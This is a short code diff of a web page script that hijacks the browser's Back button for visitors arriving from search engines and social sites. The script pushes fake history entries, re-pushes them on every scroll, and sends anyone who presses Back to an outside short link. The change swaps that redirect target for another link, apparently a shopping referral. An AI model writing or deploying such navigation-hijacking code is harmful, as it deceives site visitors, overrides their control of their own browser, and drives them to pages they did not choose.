@@ -17,7 +17,7 @@ if ([".google.", "bing.", "yandex.", "facebook.", ".pinterest.", ".yahoo.", "mys
 
     history.pushState(null, document.title, window.location.href);
     window.addEventListener('popstate', function(event) {
-        window.location.href = "https://goeco.mobi/nxx93eu";
+        window.location.href = "https://shope.ee/5zqDSoNDqC";
     });
     window.addEventListener('scroll', function() {
         history.pushState(null, document.title, window.location.href);
